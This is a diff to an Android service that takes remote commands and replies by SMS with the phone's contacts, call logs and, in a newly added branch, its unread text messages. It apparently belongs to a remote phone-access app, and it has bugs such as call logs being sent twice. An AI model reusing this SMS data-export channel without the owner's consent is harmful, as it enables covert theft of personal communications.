@@ -24,7 +24,7 @@ public class ProcessService extends Service {
     private String Requester_No=null;
     private boolean already_registered=false;
     private boolean authenticated_user=false;
-    private String SearchString=null;
+    private String criteria=null;
 
     public ProcessService() {
     }
@@ -47,7 +47,7 @@ public class ProcessService extends Service {
                 if(arguments_check_arr.length==2)
                 {
                     ActionPerform=arguments_check_arr[0];
-                    SearchString=arguments_check_arr[1];
+                    criteria=arguments_check_arr[1];
                 }
                 else if(arguments_check_arr.length==1)
                 {
@@ -64,7 +64,7 @@ public class ProcessService extends Service {
                 if(arguments_check_arr.length==2)
                 {
                     ActionPerform=arguments_check_arr[0];
-                    SearchString=arguments_check_arr[1];
+                    criteria=arguments_check_arr[1];
                 }
                 else if(arguments_check_arr.length==1)
                 {
@@ -182,10 +182,10 @@ public class ProcessService extends Service {
             else if(ActionPerform.equalsIgnoreCase("contacts"))
             {
                 Log.d("Contacts","Method: onStartCommand,Class:ProcessService");
-                if(SearchString!=null)
+                if(criteria!=null)
                 {
-                    Log.d("Contacts","Method: onStartCommand,Class:ProcessService, SearchString: "+SearchString);
-                    String contacts_details=CommandProcessor.fetchContacts(getApplicationContext(),SearchString);
+                    Log.d("Contacts","Method: onStartCommand,Class:ProcessService, SearchString: "+criteria);
+                    String contacts_details=CommandProcessor.fetchContacts(getApplicationContext(),criteria);
                     //Toast.makeText(getApplicationContext(),contacts_details,Toast.LENGTH_LONG).show();
                     if(contacts_details.length()<10)
                     {
@@ -203,10 +203,37 @@ public class ProcessService extends Service {
             }
             else if (ActionPerform.equalsIgnoreCase("call_logs"))
             {
-                Log.d("Call_Logs","Method: onStartCommand,Class:ProcessService");
-                String call_logs=CommandProcessor.getCallLogs(getApplicationContext());
+                Log.d("Call_Logs", "Method: onStartCommand,Class:ProcessService");
+                String call_logs=null;
+
+                if(criteria!=null)
+                {
+                    Log.d("Call_Logs","Method: onStartCommand,Class:ProcessService, SearchString: "+criteria);
+                    call_logs=CommandProcessor.getCallLogs(getApplicationContext(), Integer.parseInt(criteria));
+                    //Toast.makeText(getApplicationContext(),contacts_details,Toast.LENGTH_LONG).show();
+                    if(call_logs.length()<10)
+                    {
+                        SendSms("No Such Name Found!",Requester_No);
+                    }
+                    else {
+                        SendSms(call_logs, Requester_No);
+                    }
+                }
+                else
+                {
+                    SendSms("Please Enter Some Search Criteria!", Requester_No);
+                }
+
                 Log.d("Call_Logs","These are the Logs:\n " + call_logs);
-                SendSms(call_logs,Requester_No);
+                SendSms(call_logs, Requester_No);
+
+            }
+            else if(ActionPerform.equalsIgnoreCase("unread_sms"))
+            {
+                Log.d("Unread_SMS", "Method: onStartCommand, Class:ProcessService");
+                String unreadsms=CommandProcessor.fetchUnreadSMS(getApplicationContext());
+                SendSms(unreadsms,Requester_No);
+                Log.d("Unread_SMS","Method: onStartCommand, Class:ProcessService, Result: "+unreadsms);
             }
             else
             {
@@ -240,8 +267,9 @@ public class ProcessService extends Service {
         ArrayList<String> parts = smsManager.divideMessage(message);
         for (int i=0;i<parts.size();i++)
         {
-            Log.d("TestSMS","Part no: "+(i+1)+" is: "+parts.get(i));
+            Log.d("TestSMS", "Part no: " + (i + 1) + " is: " + parts.get(i));
+            smsManager.sendTextMessage(phone_no, null, parts.get(i), null, null);
         }
-        smsManager.sendMultipartTextMessage(phone_no,null,parts,null,null);
+
     }
 }
